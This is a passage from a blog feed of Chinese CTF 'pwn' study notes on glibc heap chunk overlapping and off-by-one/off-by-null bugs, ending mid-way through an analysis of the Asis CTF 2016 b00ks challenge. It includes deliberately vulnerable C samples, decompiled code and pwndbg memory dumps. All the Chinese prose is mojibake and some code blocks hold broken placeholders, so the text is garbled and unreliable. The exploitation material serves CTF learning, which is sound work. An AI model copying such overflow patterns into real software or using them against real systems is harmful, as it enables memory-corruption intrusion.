éƒ½è¢«åˆå¹¶æˆäº†ä¸€ä¸ªï¼Œè¿™é‡Œä¸»è¦æ˜¯å› ä¸º unlink çš„åŸå› ï¼Œå¯¼è‡´äº† chunk3 å’Œå‰é¢çš„ä¸¤ä¸ªï¼ˆä¸»è¦æ˜¯ pre_size æŒ‡å®šçš„å¤§å°èŒƒå›´å†…çš„ï¼‰chunk å‘ç”Ÿäº†åˆå¹¶ã€‚ä¹‹åå†è¿›è¡Œ mallocï¼Œä¼šåˆ†é…èµ°æ–°çš„é‚£ä¸ª chunk1ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">heap</span></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555758000</span><br><span class="line">Size: 0x161</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555758160</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555758180</span><br><span class="line">Size: 0x20e81</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">bin</span></span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x0</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;pwnå­¦ä¹ ç¬”è®°12chunk-extend-and-overlapping&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#pwnå­¦ä¹ ç¬”è®°12chunk-extend-and-overlapping&quot;&gt;#&lt;/a&gt; pwn å­¦ä¹ ç¬”è®°ï¼ˆ12ï¼‰</summary>
      
    
    
    
    <category term="Pwnæ‰‹çš„è‡ªæˆ‘ä¿®å…»" scheme="http://blog.g01den.top/categories/Pwn/"/>
    
    
    <category term="Pwn" scheme="http://blog.g01den.top/tags/Pwn/"/>
    
  </entry>
  
  <entry>
    <title>pwnå­¦ä¹ ç¬”è®°ï¼ˆ11ï¼‰--off_by_one</title>
    <link href="http://blog.g01den.top/posts/f1497b96.html"/>
    <id>http://blog.g01den.top/posts/f1497b96.html</id>
    <published>2024-11-09T13:31:09.000Z</published>
    <updated>2024-11-09T13:39:59.229Z</updated>
    
    <content type="html"><![CDATA[<h1 id="pwnå­¦ä¹ ç¬”è®°11off_by_one"><a class="markdownIt-Anchor" href="#pwnå­¦ä¹ ç¬”è®°11off_by_one">#</a> pwn å­¦ä¹ ç¬”è®°ï¼ˆ11ï¼‰â€“off_by_one</h1><p>â€‹åœ¨å¤„ç† for å¾ªç¯æˆ–è€… while å¾ªç¯çš„æ—¶å€™ï¼Œæœ‰çš„å¯èƒ½ä¼šé‡åˆ°å¦‚ä¸‹æƒ…å†µï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x10</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span> ; i &lt;= <span class="number">0x10</span> ; i ++)&#123;</span><br><span class="line">        buf[i] = getchar();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(buf);</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹å¤šæ¬¡è¾“å…¥å‡ ä¸ª a ä¹‹åï¼Œå‘ç°äº†æœ€åè¾“å‡ºçš„æ—¶å€™è¾“å‡ºäº† 17 ä¸ª aï¼Œæˆ‘çš„ç›®çš„ä»…ä»…åªæ˜¯éœ€è¦ 16 ä¸ª aï¼Œç»“æœè¾“å‡ºäº† 17 ä¸ª aï¼Œåƒè¿™ç§ï¼Œåœ¨å†™å…¥å­—ç¬¦ä¸²çš„æ—¶å€™å¤šå†™å…¥äº†ä¸€ä¸ªå­—èŠ‚çš„æƒ…å†µï¼Œå°±æ˜¯ off by oneã€‚</p><p>â€‹åœ¨å †ä¸­ï¼Œè¿™ç§é—®é¢˜å°¤ä¸ºä¸¥é‡ï¼Œå¯èƒ½ä¼šå¯¼è‡´è¾“å…¥çš„å­—ç¬¦è¦†ç›–äº† heap info çš„ prev_in_use æˆ–è€…å…¶ä»–çš„æ•°æ®ï¼š</p><blockquote><ol><li>æº¢å‡ºå­—èŠ‚ä¸ºå¯æ§åˆ¶ä»»æ„å­—èŠ‚ï¼šé€šè¿‡ä¿®æ”¹å¤§å°é€ æˆå—ç»“æ„ä¹‹é—´å‡ºç°é‡å ï¼Œä»è€Œæ³„éœ²å…¶ä»–å—æ•°æ®ï¼Œæˆ–æ˜¯è¦†ç›–å…¶ä»–å—æ•°æ®ã€‚ä¹Ÿå¯ä½¿ç”¨ NULL å­—èŠ‚æº¢å‡ºçš„æ–¹æ³•</li><li>æº¢å‡ºå­—èŠ‚ä¸º NULL å­—èŠ‚ï¼šåœ¨ size ä¸º 0x100 çš„æ—¶å€™ï¼Œæº¢å‡º NULL å­—èŠ‚å¯ä»¥ä½¿å¾—  <code>prev_in_use</code>  ä½è¢«æ¸…ï¼Œè¿™æ ·å‰å—ä¼šè¢«è®¤ä¸ºæ˜¯ free å—ã€‚ï¼ˆ1ï¼‰ è¿™æ—¶å¯ä»¥é€‰æ‹©ä½¿ç”¨ unlink æ–¹æ³•ï¼ˆè§ unlink éƒ¨åˆ†ï¼‰è¿›è¡Œå¤„ç†ã€‚ï¼ˆ2ï¼‰ å¦å¤–ï¼Œè¿™æ—¶  <code>prev_size</code>  åŸŸå°±ä¼šå¯ç”¨ï¼Œå°±å¯ä»¥ä¼ªé€   <code>prev_size</code>  ï¼Œä»è€Œé€ æˆå—ä¹‹é—´å‘ç”Ÿé‡å ã€‚æ­¤æ–¹æ³•çš„å…³é”®åœ¨äº unlink çš„æ—¶å€™æ²¡æœ‰æ£€æŸ¥æŒ‰ç…§  <code>prev_size</code>  æ‰¾åˆ°çš„å—çš„å¤§å°ä¸ <code>prev_size</code>  æ˜¯å¦ä¸€è‡´ã€‚</li></ol></blockquote><p>â€‹æœ€æ–°ç‰ˆæœ¬ä»£ç ä¸­ï¼Œå·²åŠ å…¥é’ˆå¯¹ 2 ä¸­åä¸€ç§æ–¹æ³•çš„ check ï¼Œä½†æ˜¯åœ¨ 2.28 åŠä¹‹å‰ç‰ˆæœ¬å¹¶æ²¡æœ‰è¯¥ check ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* consolidate backward */</span></span><br><span class="line">    <span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">      prevsize = prev_size (p);</span><br><span class="line">      size += prevsize;</span><br><span class="line">      p = chunk_at_offset(p, -((<span class="type">long</span>) prevsize));</span><br><span class="line">      <span class="comment">/* åä¸¤è¡Œä»£ç åœ¨æœ€æ–°ç‰ˆæœ¬ä¸­åŠ å…¥ï¼Œåˆ™ 2 çš„ç¬¬äºŒç§æ–¹æ³•æ— æ³•ä½¿ç”¨ï¼Œä½†æ˜¯ 2.28 åŠä¹‹å‰éƒ½æ²¡æœ‰é—®é¢˜ */</span></span><br><span class="line">      <span class="keyword">if</span> (__glibc_unlikely (chunksize(p) != prevsize))</span><br><span class="line">        malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size while consolidating&quot;</span>);</span><br><span class="line">      unlink_chunk (av, p);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>â€‹è¿˜æœ‰ç§æƒ…å†µï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> bss[<span class="number">0x20</span>] = <span class="string">&quot;aaaaaaaaaaaaaaaa&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x10</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strlen</span>(bss) == <span class="number">0x10</span>)&#123;</span><br><span class="line">        <span class="built_in">strcpy</span>(buf,bss);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(buf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹è¿™ç§æƒ…å†µï¼Œä¹çœ‹ä¸Šå»æ²¡å•¥é—®é¢˜ï¼Œä½†æ˜¯ï¼Œstrlen ä¸ä¼šè®¡ç®—ç»“å°¾çš„ \x00ï¼Œè€Œ strcpy åœ¨æ‹·è´çš„æ—¶å€™åˆä¼šå¤šæ‹·è´ä¸€ä¸ª \x00 è¿›å»ï¼Œé€ æˆå¤šå†™å…¥äº†ä¸€ä¸ªå­—èŠ‚ã€‚</p><p>â€‹ä¸Šä¸€ä¸ªé¢˜ï¼š</p><h2 id="asis-ctf-2016-b00ksåªçœ‹å‰é¢off-by-oneçš„éƒ¨åˆ†"><a class="markdownIt-Anchor" href="#asis-ctf-2016-b00ksåªçœ‹å‰é¢off-by-oneçš„éƒ¨åˆ†">#</a> Asis CTF 2016 <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2N0Zi13aWtpL2N0Zi1jaGFsbGVuZ2VzL3RyZWUvbWFzdGVyL3B3bi9oZWFwL29mZl9ieV9vbmUvQXNpc18yMDE2X2IwMGtz">b00ks</span>ï¼ˆåªçœ‹å‰é¢ off by one çš„éƒ¨åˆ†ï¼‰</h2><p>â€‹checksec ä¸€ä¸‹çœ‹çœ‹ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">g01den@MSI:/mnt/c/Users/20820/Downloads$ checksec pwn</span><br><span class="line">[*] &#x27;/mnt/c/Users/20820/Downloads/pwn&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure><p>â€‹æ¿€æ´»äº† PIEï¼Œä»¥åŠé¢˜ç›®é™„ä»¶è¢« strip è¿‡ï¼ŒæŠ±æ­‰ï¼Œæˆ‘ä¸€ä¸ªèœé¸¡è¯¯å…¥äº†å¤§ä½¬çš„ä¸–ç•Œï¼Œå•¥éƒ½çœ‹ä¸æ‡‚ï¼Œåç¼–è¯‘ä¹‹åçœ‹åˆ°é‚£ä¹ˆæŠ½è±¡çªç„¶æƒ³æ”¾å¼ƒäº†ï¼Œä¸è¿‡è¿˜æ˜¯å¾—åšã€‚</p><p>â€‹é¢˜ç›®æ˜¯ä¸€ä¸ªå¯»å¸¸çš„å›¾ä¹¦ç®¡ç†ï¼Œæœ‰åˆ›å»ºä¹¦ï¼Œåˆ é™¤ä¹¦ï¼Œç¼–è¾‘æè¿°å†…å®¹ï¼Œè¾“å‡ºä¹¦ç±ä¿¡æ¯ï¼Œä¿®æ”¹æœ€è¿‘è®¿é—®çš„ä½œè€…åï¼Œé€€å‡ºã€‚</p><p>â€‹å…ˆä¸çœ‹åˆ«çš„ï¼Œmain æ²¡å•¥ç”¨ï¼Œå…ˆçœ‹ addï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">sub_F55</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [rsp+0h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [rsp+4h] [rbp-1Ch]</span></span><br><span class="line">  <span class="type">void</span> *v3; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line">  <span class="type">void</span> *ptr; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="type">void</span> *v5; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v1 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\nEnter book name size: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v1);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt; <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_2;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Enter book name (Max 32 chars): &quot;</span>);</span><br><span class="line">  ptr = <span class="built_in">malloc</span>(v1);</span><br><span class="line">  <span class="keyword">if</span> ( !ptr )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;unable to allocate enough space&quot;</span>);</span><br><span class="line">    <span class="keyword">goto</span> LABEL_17;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)readName(ptr, v1 - <span class="number">1</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;fail to read name&quot;</span>);</span><br><span class="line">    <span class="keyword">goto</span> LABEL_17;</span><br><span class="line">  &#125;</span><br><span class="line">  v1 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\nEnter book description size: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v1);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">LABEL_2:</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Malformed size&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v5 = <span class="built_in">malloc</span>(v1);</span><br><span class="line">    <span class="keyword">if</span> ( v5 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Enter book description: &quot;</span>);</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)readName(v5, v1 - <span class="number">1</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Unable to read description&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        v2 = sub_B24();</span><br><span class="line">        <span class="keyword">if</span> ( v2 == <span class="number">-1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">printf</span>(<span class="string">&quot;Library is full&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          v3 = <span class="built_in">malloc</span>(<span class="number">0x20</span>uLL);</span><br><span class="line">          <span class="keyword">if</span> ( v3 )</span><br><span class="line">          &#123;</span><br><span class="line">            *((_DWORD *)v3 + <span class="number">6</span>) = v1;</span><br><span class="line">            *((_QWORD *)off_202010 + v2) = v3;</span><br><span class="line">            *((_QWORD *)v3 + <span class="number">2</span>) = v5;</span><br><span class="line">            *((_QWORD *)v3 + <span class="number">1</span>) = ptr;</span><br><span class="line">            *(_DWORD *)v3 = ++unk_202024;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="built_in">printf</span>(<span class="string">&quot;Unable to allocate book struct&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Fail to allocate memory&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">LABEL_17:</span><br><span class="line">  <span class="keyword">if</span> ( ptr )</span><br><span class="line">    <span class="built_in">free</span>(ptr);</span><br><span class="line">  <span class="keyword">if</span> ( v5 )</span><br><span class="line">    <span class="built_in">free</span>(v5);</span><br><span class="line">  <span class="keyword">if</span> ( v3 )</span><br><span class="line">    <span class="built_in">free</span>(v3);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹åˆ†æä¸€æ³¢ï¼Œæœ‰ä¸€äº›éœ€è¦è®°ä½ä½œç”¨çš„é˜¿å˜é‡åï¼Œæ¯”å¦‚ v1ï¼š</p><blockquote><ul><li><p>v1 å¯ä»¥å¾ˆæ˜æ˜¾çœ‹å‡ºæ¥ï¼Œv1 æ˜¯å­˜æ”¾çš„æ˜¯ book çš„ name çš„å¤§å°ï¼Œptr å°±æ˜¯ name å­˜æ”¾çš„åœ°å€ï¼š</p></li><li><figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre>v1 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="2"></td><td><pre>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nEnter book name size: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>  <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v1<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>  <span class="token keyword">if</span> <span class="token punctuation">(</span> v1 <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="5"></td><td><pre>    <span class="token keyword">goto</span> LABEL_2<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Enter book name (Max 32 chars): "</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>  ptr <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span>v1<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span>codeï¿¼<span class="token number">5</span><span class="token operator">--</span><span class="token operator">></span></pre></td></tr></table></figure></li><li><p>ä¹‹åå¼€äº†ä¸ª v3ï¼Œå­˜æ”¾äº† book çš„æ‰€æœ‰ä¿¡æ¯ï¼š</p></li><li><figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre>v3 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x20uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="2"></td><td><pre>          <span class="token keyword">if</span> <span class="token punctuation">(</span> v3 <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="3"></td><td><pre>          <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>            <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span>v3 <span class="token operator">+</span> <span class="token number">6</span><span class="token punctuation">)</span> <span class="token operator">=</span> v1<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="5"></td><td><pre>            <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span>off_202010 <span class="token operator">+</span> v2<span class="token punctuation">)</span> <span class="token operator">=</span> v3<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>            <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span>v3 <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">=</span> v5<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>            <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span>v3 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">=</span> ptr<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>            <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span>v3 <span class="token operator">=</span> <span class="token operator">++</span>unk_202024<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>            <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="10"></td><td><pre>          <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span>codeï¿¼<span class="token number">6</span><span class="token operator">--</span><span class="token operator">></span></pre></td></tr></table></figure></li></ul></blockquote><p>â€‹åˆ†é…ä¸¤æ¬¡ï¼Œä»£ç ç±»ä¼¼è¿™æ ·ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x20</span>,<span class="string">&quot;book1_name&quot;</span>,<span class="number">200</span>,<span class="string">&quot;book1_destruct&quot;</span>)</span><br><span class="line">add(<span class="number">0x21000</span>,<span class="string">&quot;book1_name&quot;</span>,<span class="number">0x21000</span>,<span class="string">&quot;book1_destruct&quot;</span>)</span><br></pre></td></tr></table></figure><p>â€‹è¿™ä¸ªå‡½æ•°å­˜åœ¨ä¸€äº›é—®é¢˜ï¼Œa1 æ˜¯æˆ‘ä»¬æƒ³è¦å†™å…¥çš„å­—ç¬¦ä¸²çš„èµ·å§‹åœ°å€ï¼Œa2 æ˜¯åˆ¤å®šè¾¹ç¼˜ï¼Œä½†æ˜¯ï¼Œä» 0 å¼€å§‹ï¼Œä¸€ç›´åˆ° a2 ä¸ºæ­¢ï¼Œå¾ˆæ˜¾ç„¶å¤šè¿›è¡Œäº†ä¸€æ¬¡è¯»å…¥ï¼Œå› ä¸ºè¿™é‡Œçš„é€»è¾‘æ˜¯å…ˆè¯»å…¥ï¼Œå†åˆ¤æ–­ i ä¸ a2 æ˜¯å¦ç›¸ç­‰ï¼Œæ‰€ä»¥è¿™é‡Œå°±å¤šå¾ªç¯äº†ä¸€æ¬¡ï¼Œé€ æˆäº† offbyoneï¼Œç»“æŸå¾ªç¯ä¹‹åï¼Œåˆå°†åä¸€ä½çš„å†…å­˜ä¿®æ”¹æˆäº† \x00ï¼Œå› æ­¤å‘ç”Ÿäº†æº¢å‡ºï¼Œä¾‹å¦‚ä¸€ä¸ªæ•°ç»„æ˜¯ 32 å­—èŠ‚ï¼Œè¿™ä¸ªç¨‹åºè°ƒç”¨è¿™ä¸ªå‡½æ•°çš„æ—¶å€™ï¼Œä¸€ç›´éƒ½æ˜¯ç”¨çš„ size-1ï¼Œæ‰€ä»¥ä¼ å…¥çš„æ˜¯ 31ï¼Œè¿™ä¸ªç¨‹åºå°±åˆšå¥½åšåˆ°äº†è®©æ•´ä¸ªæ•°ç»„åˆšå¥½å¯ä»¥å†™æ»¡ï¼Œä¹Ÿå°±æ˜¯å†™é“ buf [31]ï¼Œè¿™é‡Œåˆšå¥½å†™æ»¡ï¼Œä½†æ˜¯ï¼Œæœ‰ä¸ªå…³é”®çš„é—®é¢˜ï¼Œæœ€åä¸€ä¸ªè¿˜æ“ä½œäº†ä¸€ä¸‹ï¼Œè®© * a1=0ï¼Œè¿™ä¹Ÿå°±å¯¼è‡´äº† buf [32]=0 çš„å‘ç”Ÿï¼Œæº¢å‡ºäº†ä¸€ä¸ªå­—èŠ‚ï¼Œä¹Ÿå°±é€ æˆäº† offbyoneï¼Œæˆ–è€…è¯´ off by nullã€‚</p><p>â€‹ä¸Š gdb çœ‹çœ‹ï¼Œå…ˆè¾“å…¥ 32 ä¸ª a ä½œä¸ºåå­—ä¹‹åï¼Œé‚£æ®µå†…å­˜å˜æˆäº†è¿™æ ·ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">search aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</span></span><br><span class="line">Searching for value: &#x27;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#x27;</span><br><span class="line">pwn             0x555555602040 0x6161616161616161 (&#x27;aaaaaaaa&#x27;)</span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">x/30gx 0x555555602040</span></span><br><span class="line">0x555555602040: 0x6161616161616161      0x6161616161616161</span><br><span class="line">0x555555602050: 0x6161616161616161      0x6161616161616161</span><br><span class="line">0x555555602060: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555602070: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555602080: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555602090: 0x0000000000000000      0x0000000000000000</span><br><span 